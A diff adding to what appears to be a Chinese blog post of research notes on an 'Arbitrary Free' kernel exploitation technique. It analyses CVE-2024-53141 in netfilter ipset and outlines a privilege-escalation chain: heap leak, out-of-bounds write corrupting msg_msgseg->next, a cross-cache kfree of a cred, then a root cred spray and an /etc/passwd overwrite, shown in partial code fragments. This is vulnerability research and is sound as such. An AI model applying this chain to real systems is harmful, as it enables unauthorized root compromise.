@@ -408,4 +408,251 @@ gef> slab-contains 0xffff9ce542b6d180
 
 ## Arbitrary Free Object
 
-咕了
+想要满足 AFO，主要就是两个关键：
+1. 有一个 ptr 指向 heap area，并且有方法可以 `kfree()` 掉它（不是 `kmem_cache_free()`，因为它需要看 metadata，如果不对就会 g）
+2. 能够被低特权用户分配、释放。
+除此之外，如果在分配与释放之间有足够长的空间窗口也能比较显著的增加可利用性。
+
+作者在找 AFO 的时候主要是通过追踪所有 `kfree()` 及其变种，追踪其是否能被用户态触发。
+
+对于候选，判断这个 ptr 是否是一个 local variable 并且 context 里有 kmalloc —— 这种 temporary var 会被去掉，因为 window 不够长。完成之后，他们继续做反向数据流追踪，最终选出那些 object 不在 stack 和 global memory region 里的 object。
+
+> 说白了就是找那种有 Obj->ptr，并且 Obj obj 被分配在 heap area，并且分配和释放是可控的调用
+
+然后继续 filter，把那些 dedicated caches 的 Obj 过滤掉，以及那些 temporary 的 Obj 过滤掉，最后把特权调用过滤掉，留下来的就是可以用的。
+
+> 其实 temporary 的 Obj 也不是不能用，如果 allocation 和 deallocation 过程中有 `copy_to_user()`，那其实可以利用 FUSE 之类的去延长时间窗口，这类作者没有过滤掉。
+
+最终其实包含了基本上所有 size cache 的 object ~~依旧 msg_msg 概念神~~
+![image](https://cdn.nova.gal/img/vscode_picgo_1780485557983.png)
+
+## Case Study
+
+两个多月没动了，但是当时看的时候还是有很多疑惑🤔，但是现在想不起来了。现在重新思考的话：
+1. 大概就是公开几个都是多种方式能打的，唯一一个其他方式不能打而它能打的没公开；
+2. 都是需要 read + write 原语做泄露和改 ptr 的，但论文里 claim 只需要一个 Arbitrary Free 原语（反正怎么说，原语定义就这样，我要硬说你 leak 也算是原语的一部分你也没辙）。
+3. 所谓不需要 AAW 和 AAR，但是其实用了一个 fixed offset 去算 cred 的位置，至少在我的机子上是跑不通的，reliability 难说哈。
+
+### Analyze
+总而言之我们来看 CVE-2024-53141，这是一个 out-of-bounds 漏洞，在 `net/netfilter/ipset/ip_set_bitmap_ip.c` 里面存在一个利用 `bitmap:ip` 把位图表示一个 ip 段的操作。
+
+> 之前调的，现在忘了，直接看 AI 吧。
+
+```c
+/* Type structure */
+struct bitmap_ip {
+	unsigned long *members;	/* the set members */
+	u32 first_ip;		/* host byte order, included in range */
+	u32 last_ip;		/* host byte order, included in range */
+	u32 elements;		/* number of max elements in the set */
+	u32 hosts;		/* number of hosts in a subnet */
+	size_t memsize;		/* members size */
+	u8 netmask;		/* subnet netmask */
+	struct timer_list gc;	/* garbage collection */
+	struct ip_set *set;	/* attached to this ip_set */
+	unsigned char extensions[]	/* data extensions */
+		__aligned(__alignof__(u64));
+};
+
+/* ADT structure for generic function args */
+struct bitmap_ip_adt_elem {
+	u16 id;
+};
+```
+
+在函数 `bitmap_ip_uadt` 里，做了 CIDR 之后，ip 被改写，但随后没有再次检查 `ip >= map->first_ip`，导致 `ip_to_id` 直接处理之前的 `map->first_ip` 之前的地址。
+
+```c
+// ① 第一次边界检查：用原始 ip 做检查
+if (ip < map->first_ip || ip > map->last_ip)
+    return -IPSET_ERR_BITMAP_RANGE;
+// 传入 ip = 0xFFFFFFFF, first_ip = 0xFFFFFFCB → 检查通过 ✓
+
+// ② CIDR 掩码：ip 被改写为网络地址（完全不同的值！）
+} else if (tb[IPSET_ATTR_CIDR]) {
+    u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);
+    ip_set_mask_from_to(ip, ip_to, cidr);
+    // CIDR=3: ip = 0xFFFFFFFF & 0xE0000000 = 0xE0000000
+    //         ip_to = 0xFFFFFFFF
+}
+
+// ③ 只检查 ip_to 的上界，完全没有重新检查 ip 的下界
+if (ip_to > map->last_ip)
+    return -IPSET_ERR_BITMAP_RANGE;
+// 0xFFFFFFFF > 0xFFFFFFFF → FALSE → 通过 ✓
+
+// ④ 循环从 ip=0xE0000000 开始，没有 ip >= first_ip 的限制！
+for (; !before(ip_to, ip); ip += map->hosts) {
+    e.id = ip_to_id(map, ip);   // ← OOB 在这里发生
+    ret = adtfn(set, &e, &ext, &ext, flags);
+    ...
+}
+```
+
+在 `ip_to_id` 里面
+```
+static u32 ip_to_id(const struct bitmap_ip *m, u32 ip)
+{
+    return ((ip & ip_set_hostmask(m->netmask)) - m->first_ip) / m->hosts;
+}
+```
+
+当 ip = 0xE0000000，first_ip = 0xFFFFFFCB，netmask = 32，hosts = 1：
+
+
+id (u32) = 0xE0000000 - 0xFFFFFFCB = 0xE0000035   （无符号下溢回绕）
+
+放回到 `bitmap_ip_adt_elem` 的时候，这个 id 就被截断：
+id (u16) = 0x0035 = 53。
+
+而这个 map 的分配是 `map = ip_set_alloc(sizeof(*map) + elements * set->dsize);`，也就是 `[0, elements-1]`，在这里正好是 `[0, 0x34]`，因此有一个 slot 可以越界。
+
+### Exploit
+利用分三个阶段，完整流程：
+
+
+阶段 1：OOB 读 → 泄露堆地址
+阶段 2：OOB 写 → 构造 arbitrary free
+阶段 3：DirtyFree → cross-cache free + root cred 替换
+
+
+#### Heap Leak
+
+目标 cache：kmalloc-cg-512
+
+构造 bitmap:ip map，大小精确落入 kmalloc-cg-512：
+
+```c
+size = sizeof(struct bitmap_ip) + 0x35 × dsize_comment
+     = 0x58 + 0x35 × 0x8 = 0x200  →  kmalloc-cg-512 ✓
+```
+
+堆布局准备：
+
+
+`[msg_msgseg] [msg_msgseg] ... [bitmap:ip map] [msg_msgseg] [msg_msgseg] ...`
+                                    
+OOB 写（带 COMMENT 扩展标志）：
+
+
+```c
+map->extensions[0x35] = get_ext(map, id=0x35)
+                       ↕
+相邻 msg_msgseg 起始位置
+```
+
+COMMENT 扩展在 ext 区域写入的是指向 comment 字符串缓冲区的内核堆指针。该指针被写入相邻 msg_msgseg 的数据区域，之后通过 msgrcv 读回消息内容时，扫描其中符合 0xffff... 模式的值即可得到内核堆地址：
+
+```c
+// 泄露扫描
+for(int j = 0; j < MSG_SIZE; j += 8) {
+    if((msg.mtext[j] & 0xffff000000000000) == 0xffff000000000000) {
+        heap_leak_addr = msg.mtext[j];
+        break;
+    }
+}
+
+// 从泄露地址推算 cred 位置（依赖固定偏移）
+cred_addr = (heap_leak_addr & 0xfffffffffff00000) | 0x68e40;
+```
+
+#### OOB
+目标 cache：kmalloc-cg-2048
+
+构造更大的 bitmap:ip map：
+
+```c
+size = sizeof(struct bitmap_ip) + 0x7a × dsize_counter
+     = 0x58 + 0x7a × 0x10 = 0x7F8  →  kmalloc-cg-2048（slot 0x800）
+```
+同样在相邻位置 spray msg_msgseg（这次 msg_msgseg 也落在 kmalloc-cg-2048）。
+
+OOB 写（带 COUNTER 扩展标志）：
+
+COUNTER 扩展在 ext 区域存储的是 bytes/packets 计数，直接写 64 位值。攻击者将 cred_addr 作为计数值传入：
+
+```c
+// 触发 OOB 写
+mnl_attr_put_u64(nlh, IPSET_ATTR_BYTES | NLA_F_NET_BYTEORDER,
+                 bswap_64(cred_addr));    // ← 写入 cred 地址
+mnl_attr_put_u64(nlh, IPSET_ATTR_PACKETS | NLA_F_NET_BYTEORDER,
+                 bswap_64(cred_addr));
+```
+
+`e->id = 0x7A` 时越界写到下一个 slot 的起始位置：
+
+```
+bitmap:ip map (0x7F8 bytes)
++---+---+---+...+---+  ← map 分配结束（slot 0x800 还剩 0x8 字节）
+                    ↓OOB（+0 bytes，下个 slot 起始）
+```
+相邻 msg_msgseg->next = cred_addr   ← 被覆写！
+msg_msgseg 结构体：
+
+```
+struct msg_msgseg {
+    struct msg_msgseg *next;  // offset 0 ← 这里被写成 cred_addr
+    char data[];
+};
+```
+
+#### DirtyFree
+触发 arbitrary free：
+
+```c
+msgctl(msqid[i], IPC_RMID, NULL);
+// → freeque()
+// → free_msg()
+// → kfree(msg_msgseg->next)   ← msg_msgseg->next == cred_addr
+// → kfree(cred_addr)          ← 把 cred 对象释放了！
+```
+
+这是 cross-cache free：free_msg 在 kmalloc-cg-2048 上下文中调用 kfree(cred_addr)，而 cred 对象属于 kmalloc-192 cache。
+
+```c
+kmalloc-192 freelist:  ... → [cred_addr] → ...
+                                  ↑
+                           cred 对象被挂进了 freelist
+```
+内核此时触发 oops（free_msg 继续遍历链表时解引用了 cred->usage = 1 当指针），但子进程在此之前已经就绪：
+
+```c
+子进程（io_uring personality 持有 user cred 引用）
+  ↓ msgctl 触发 kfree(cred_addr)
+  ↓ fork 大量 sudo 进程 → root cred 分配，落入 freed slot
+  ↓ io_uring personality 仍指向 cred_addr
+  ↓ io_uring OPENAT with personality → 以 root cred 执行
+  ↓ 写 /etc/passwd → 得到 root shell
+```
+
+### Overview
+```c
+create_ip_set (kmalloc-cg-512, elements=0x35, WITH_COMMENT)
+│
+├─ spray msg_msgseg (kmalloc-cg-512，相邻填充)
+│
+├─ trigger_oob_leak (ip=0xFFFFFFFF, CIDR=3)
+│    ip_to_id(0xE0000000) = 0xE0000035 → u16 truncate → 0x0035
+│    OOB write: extensions[0x35] = comment 指针 → 覆盖邻 msg_msgseg 数据
+│    msgrcv 读出泄露地址 → 计算 cred_addr
+│
+create_ip_set (kmalloc-cg-2048, elements=0x7a, WITH_COUNTERS)
+│
+├─ spray msg_msgseg (kmalloc-cg-2048，相邻填充)
+│
+├─ trigger_oob_write (ip=0xFFFFFFFF, CIDR=3, bytes/packets=cred_addr)
+│    ip_to_id(0xE0000000) = 0xE0000035 → ... → 0x7A (不同集合参数)
+│    OOB write: extensions[0x7A] = cred_addr → 覆盖邻 msg_msgseg->next
+│
+├─ msgctl(IPC_RMID) → free_msg() → kfree(cred_addr)  [cross-cache free]
+│
+└─ root cred spray → 占据 freed cred slot → root shell
+```
+
+## Comments
+
+其实 Arbitrary Free 并不算是一个非常 novel 的利用手法，但是这篇文章比较系统的进行了分析，并且给了一个相对易用的 workflow，也给平常打 kernel 提供了一种方案。然而个人觉得他的可靠性并不高，完全没有办法达到论文 claim 的 95+ on idle 的成功率，只能说勉强能用。关键的 innovation 应该还是说可以做 cross-cache free，这个比 DirtyCred 好一些。
+
+另外大概也就是写论文方面，攻击类的论文感觉就是这样写了，从 kCTF 里面抄个利用手法，然后取个名字，打几个 realcase，然后做个对比，系统分析一下原语，最后搞个防御，公公又式式。
+
+> btw io_uring 那套 cred spray 感觉也是 DirtyCred 的东西，爽缝合。
